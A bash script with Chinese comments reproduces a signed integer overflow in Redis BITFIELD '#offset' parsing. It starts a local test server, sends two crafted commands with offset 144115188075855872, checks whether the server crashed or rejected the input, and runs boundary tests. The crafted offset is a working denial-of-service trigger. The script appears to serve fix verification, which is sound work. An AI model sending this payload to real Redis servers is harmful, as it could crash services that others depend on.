#!/usr/bin/env bash
# 复现脚本: Redis BITFIELD 有符号整数溢出漏洞
# 来源: redis/redis@c5ac9714
# 漏洞类型: 有符号整数溢出 (CVE-待分配)
# 生成时间: 2026-07-11

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${YELLOW}============================================================${NC}"
echo -e "${YELLOW}  Redis BITFIELD #offset 有符号整数溢出漏洞复现${NC}"
echo -e "${YELLOW}============================================================${NC}"
echo ""
echo "来源提交: c5ac9714"
echo "关联 Issue: #15389"
echo "关联 PR: #15433"
echo ""
echo "漏洞描述: BITFIELD/BITFIELD_RO 的 #<offset> 语法在处理极大偏移量时，"
echo "          乘法 loffset * bits 在 long long 上发生有符号整数溢出。"
echo "          在 UBSAN/加固构建中导致进程崩溃（DoS）。"
echo ""

# ============ 检查环境 ============
echo -e "${BLUE}[1/5] 检查环境...${NC}"

REDIS_SERVER=""
REDIS_CLI=""

# 查找 redis-server 和 redis-cli
for suffix in "-ubsan" ""; do
    if command -v "redis-server${suffix}" &> /dev/null; then
        REDIS_SERVER="redis-server${suffix}"
    fi
    if command -v "redis-cli${suffix}" &> /dev/null; then
        REDIS_CLI="redis-cli${suffix}"
    fi
done

if [ -z "$REDIS_SERVER" ] || [ -z "$REDIS_CLI" ]; then
    echo -e "${RED}错误: 未找到 redis-server 或 redis-cli${NC}"
    echo ""
    echo "请确保 Redis 已安装，或者从源码编译："
    echo ""
    echo "  # 标准编译"
    echo "  make -C src redis-server redis-cli"
    echo ""
    echo "  # 推荐：带 UBSAN 编译（能直接观察到崩溃）"
    echo "  make -C src SANITIZER=undefined OPTIMIZATION=-O0 \\"
    echo "       PROG_SUFFIX=-ubsan redis-server-ubsan redis-cli-ubsan"
    echo ""
    exit 1
fi

echo -e "${GREEN}✓ 找到 Redis 工具:${NC}"
echo "  Server: $REDIS_SERVER"
echo "  CLI:    $REDIS_CLI"

# ============ 启动 Redis 服务器 ============
echo ""
echo -e "${BLUE}[2/5] 启动临时 Redis 服务器...${NC}"

PORT=6415
TMPDIR=$(mktemp -d /tmp/redis-bitfield-overflow.XXXXXX)
LOG="$TMPDIR/server.log"

cleanup() {
    echo ""
    echo -e "${BLUE}[Cleanup] 停止服务器并清理...${NC}"
    $REDIS_CLI -p $PORT SHUTDOWN NOSAVE 2>/dev/null || true
    pkill -f "redis-server.*--port $PORT" 2>/dev/null || true
    sleep 1
    rm -rf "$TMPDIR"
}
trap cleanup EXIT

$REDIS_SERVER --port $PORT --bind 127.0.0.1 \
    --save '' --appendonly no --dir "$TMPDIR" \
    --daemonize no > "$LOG" 2>&1 &
SERVER_PID=$!

# 等待服务器就绪
echo -n "  等待服务器就绪"
for i in {1..30}; do
    if $REDIS_CLI -p $PORT PING &>/dev/null; then
        echo ""
        echo -e "${GREEN}✓ 服务器已就绪 (PID: $SERVER_PID)${NC}"
        break
    fi
    echo -n "."
    sleep 0.2
done

if ! $REDIS_CLI -p $PORT PING &>/dev/null; then
    echo ""
    echo -e "${RED}✗ 服务器启动失败${NC}"
    cat "$LOG" | tail -20
    exit 1
fi

# ============ 执行 PoC ============
echo ""
echo -e "${BLUE}[3/5] 执行溢出触发命令...${NC}"
echo ""
echo "  命令1: BITFIELD_RO k GET i64 '#144115188075855872'"
echo "  命令2: BITFIELD k GET i64 '#144115188075855872'"
echo ""
echo "  其中 144115188075855872 = floor(LLONG_MAX / 64) + 1"
echo "  乘以 64 位宽度后必然溢出 long long"
echo ""

echo -e "${YELLOW}--- 执行命令1 (BITFIELD_RO) ---${NC}"
$REDIS_CLI -p $PORT BITFIELD_RO k GET i64 '#144115188075855872' 2>&1 || true

echo ""
echo -e "${YELLOW}--- 执行命令2 (BITFIELD) ---${NC}"
$REDIS_CLI -p $PORT BITFIELD k GET i64 '#144115188075855872' 2>&1 || true

# ============ 检查服务器状态 ============
echo ""
echo -e "${BLUE}[4/5] 检查服务器状态...${NC}"
sleep 1

if kill -0 $SERVER_PID 2>/dev/null; then
    echo -e "${GREEN}✓ 服务器进程仍在运行${NC}"
    
    if $REDIS_CLI -p $PORT PING &>/dev/null; then
        echo -e "${GREEN}✓ PING 响应正常${NC}"
        echo ""
        echo -e "${GREEN}============================================================${NC}"
        echo -e "${GREEN}  结论：漏洞已修复！${NC}"
        echo -e "${GREEN}  服务器拒绝了非法偏移量并继续正常运行。${NC}"
        echo -e "${GREEN}============================================================${NC}"
    else
        echo -e "${RED}✗ PING 无响应（服务器可能僵死）${NC}"
        echo ""
        echo -e "${RED}============================================================${NC}"
        echo -e "${RED}  服务器无响应，请检查日志${NC}"
        echo -e "${RED}============================================================${NC}"
    fi
else
    echo -e "${RED}✗ 服务器进程已终止${NC}"
    echo ""
    
    # 检查日志是否有 UBSAN 错误
    if grep -q "runtime error: signed integer overflow" "$LOG"; then
        echo -e "${RED}日志中检测到 UBSAN 溢出错误:${NC}"
        grep "runtime error: signed integer overflow" "$LOG"
        echo ""
        echo -e "${RED}============================================================${NC}"
        echo -e "${RED}  结论：漏洞复现成功！${NC}"
        echo -e "${RED}  服务器因整数溢出而崩溃（DoS）。${NC}"
        echo -e "${RED}============================================================${NC}"
    else
        echo -e "${YELLOW}日志内容（最后 20 行）:${NC}"
        tail -20 "$LOG"
        echo ""
        echo -e "${YELLOW}============================================================${NC}"
        echo -e "${YELLOW}  服务器已退出，但未在日志中找到预期的 UBSAN 错误。${NC}"
        echo -e "${YELLOW}  可能使用了未启用 UBSAN 的构建。${NC}"
        echo -e "${YELLOW}============================================================${NC}"
    fi
fi

# ============ 额外测试 ============
echo ""
echo -e "${BLUE}[5/5] 额外边界值测试...${NC}"

# 重启服务器用于边界测试
$REDIS_CLI -p $PORT SHUTDOWN NOSAVE 2>/dev/null || true
sleep 1
pkill -f "redis-server.*--port $PORT" 2>/dev/null || true
sleep 1

$REDIS_SERVER --port $PORT --bind 127.0.0.1 \
    --save '' --appendonly no --dir "$TMPDIR" \
    --daemonize no > "$LOG" 2>&1 &
SERVER_PID=$!
sleep 1

echo ""
echo "测试负数偏移（应被拒绝）："
$REDIS_CLI -p $PORT BITFIELD k GET i64 '#-1' 2>&1 || true

echo ""
echo "测试极大值偏移（应被拒绝）："
$REDIS_CLI -p $PORT BITFIELD k GET i64 '#999999999999999999999' 2>&1 || true

echo ""
echo "测试正常偏移（应成功）："
$REDIS_CLI -p $PORT BITFIELD k GET i8 '#0' 2>&1 || true

echo ""
echo -e "${GREEN}所有测试完成。${NC}"

# cleanup 会由 trap 自动执行
